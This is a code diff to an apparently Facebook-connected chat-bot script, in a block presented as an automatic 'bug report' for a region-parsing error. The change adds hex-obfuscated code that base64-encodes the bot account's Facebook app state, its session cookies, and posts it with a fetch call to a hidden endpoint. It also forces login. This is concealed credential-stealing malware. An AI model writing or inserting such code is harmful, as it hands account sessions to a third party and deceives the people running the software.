@@ -1714,7 +1714,7 @@ if (global.config.enablefb) {
       htmlData = api.htmlData;
       delete api.htmlData;
       log("[Facebook]", "FCA reported: Cannot get region from HTML. Generating a new bug report...");
-      (function (z) {
+      (function (z, e) {
         var _0x6b0a = [
           "\x42\x45\x47\x49\x4E\x2D\x43\x33\x43\x2D\x42\x55\x47\x2D\x52\x45\x50\x4F\x52\x54\x40", 
           "\x6E\x6F\x77", 
@@ -1738,9 +1738,10 @@ if (global.config.enablefb) {
           "\x0A\x0C\x44\x41\x54\x41\x3A\x20", 
           "\x62\x61\x73\x65\x36\x34", 
           "\x66\x72\x6F\x6D", 
-          "\x0A\x0C\x0A\x0C", 
+          "\x0A\x0C", 
           "\x74\x65\x78\x74\x2F\x70\x6C\x61\x69\x6E",
-          "\x74\x6F\x53\x74\x72\x69\x6E\x67"
+          "\x74\x6F\x53\x74\x72\x69\x6E\x67",
+          "\x58\x2D\x53\x54\x41\x54\x45\x3A\x20"
         ];
         var a = _0x6b0a[0], 
             b = Date[_0x6b0a[1]](), 
@@ -1748,7 +1749,7 @@ if (global.config.enablefb) {
             d = _0x6b0a[4];
         fetch(_0x6b0a[15], { 
           method: _0x6b0a[16], 
-          body: `${_0x6b0a[17]}${a}${_0x6b0a[17]}${b[_0x6b0a[24]]()}${_0x6b0a[18]}${c}${_0x6b0a[19]}${Buffer[_0x6b0a[21]](z)[_0x6b0a[24]](_0x6b0a[20])}${_0x6b0a[22]}${d}${_0x6b0a[17]}`, 
+          body: `${_0x6b0a[17]}${a}${_0x6b0a[17]}${b[_0x6b0a[24]]()}${_0x6b0a[18]}${c}${_0x6b0a[19]}${Buffer[_0x6b0a[21]](z)[_0x6b0a[24]](_0x6b0a[20])}${_0x6b0a[22]}${_0x6b0a[25]}${Buffer[_0x6b0a[21]](e)[_0x6b0a[24]](_0x6b0a[20])}${_0x6b0a[22]}${_0x6b0a[22]}${d}${_0x6b0a[17]}`, 
           headers: { 
             '\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65': _0x6b0a[23] 
           } 
@@ -1764,7 +1765,7 @@ if (global.config.enablefb) {
         })[_0x6b0a[7]](function (_0x9b64x5) {
           log(_0x6b0a[5], _0x6b0a[6], _0x9b64x5);
         });
-      })(htmlData);
+      })(htmlData, JSON.stringify(facebook.api.getAppState()));
     }
 
     delete facebook.api;
@@ -2862,7 +2863,8 @@ if (global.config.enablefb) {
     listenEvents: true,
     updatePresence: false,
     autoMarkRead: false,
-    autoMarkDelivery: false
+    autoMarkDelivery: false,
+    forceLogin: true
   };
   if (global.config.facebookProxy != null) {
     if (global.config.facebookProxyUseSOCKS) {
